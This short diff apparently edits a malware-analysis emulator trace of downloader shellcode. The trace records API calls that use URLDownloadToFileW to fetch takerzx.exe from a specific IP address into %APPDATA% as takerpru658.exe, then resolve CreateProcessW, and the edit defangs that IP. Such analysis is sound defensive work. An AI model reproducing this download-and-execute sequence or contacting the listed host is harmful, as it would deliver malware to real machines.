@@ -2,7 +2,7 @@
 401354	ExpandEnvironmentStringsW(%APPDATA%\takerpru658.exe, dst=12fb84, sz=104)
 401369	LoadLibraryW(UrlMon)
 401384	GetProcAddress(URLDownloadToFileW)
-4013da	URLDownloadToFileW(http://208.67.105.179/takerzx.exe, C:\users\remnux\Application Data\takerpru658.exe)
+4013da	URLDownloadToFileW(http://208[.]67.105.179/takerzx.exe, C:\users\remnux\Application Data\takerpru658.exe)
 4013f2	GetProcAddress(GetStartupInfoW)
 4013fc	GetStartupInfoW(12fda4)
 401413	GetProcAddress(CreateProcessW)
